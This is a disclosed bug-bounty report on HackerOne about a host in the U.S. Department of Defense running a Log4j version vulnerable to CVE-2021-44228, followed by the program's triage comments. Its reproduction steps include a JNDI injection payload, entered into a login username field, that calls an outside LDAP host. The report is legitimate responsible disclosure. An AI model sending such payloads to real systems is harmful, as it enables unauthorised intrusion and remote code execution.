---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/use-of-externally-controlled-format-string
  - env/web
substate: "resolved"
weakness: "Use of Externally-Controlled Format String"
enriched: true
body: true
date: 2022-01-19
submitted: 2021-12-31T00:55:49.853Z
bounty_usd: null
votes: 2
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "alex_gaynor"
source: "https://hackerone.com/reports/1438393"
title: "███ ████████ running a vulnerable log4j"
---
# ███ ████████ running a vulnerable log4j

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 2 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2022-01-19

- Report: [https://hackerone.com/reports/1438393](https://hackerone.com/reports/1438393)
- CWE: Use of Externally-Controlled Format String
- Submitted: 2021-12-31T00:55:49.853Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

#Report

**Description:**

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228

## Impact

Probably arbitrary code execution

## System Host(s)
███████

## Affected Product(s) and Version(s)


## CVE Numbers
CVE-2021-44228

## Steps to Reproduce
1. Browse to https://██████████/█████████https%3A%2F%2F███%2F
2. Enter a `${jndi:ldap://dns-server-yoi-control/a}` into the username field
3. Enter a random password
4. Submit

Observe that a request was made to your DNS server. This strongly suggests a vulnerable log4j.

## Suggested Mitigation/Remediation Actions
Update log4j or disable jndi support.



#Activity Timeline

2021-12-10 18:16 (-0600) (comment)
Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team

---

2021-12-13 08:29 (-0600): @agent-l8 (report severity updated)
null

---

2021-12-13 08:29 (-0600): @agent-l8 (bug triaged)
Greetings,

We have validated the vulnerability you reported and are preparing to forward this report to the affected DoD system owner for resolution.

Thank you for bringing this vulnerability to our attention!

We will endeavor to answer any questions the system owners may have regarding this report; however, there is a possibility we will need to contact you if they require more information to resolve the vulnerability.

You will receive another status update after we have confirmed your report has been resolved by the system owner. If you have any questions, please let me know.

Thanks again for supporting the DoD Vulnerability Disclosure Program.

Regards,

The VDP Team

---

## Timeline

- **Report Filed**
- **Report Cloned**
- **Report Triaged**
- **Report Severity Updated**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
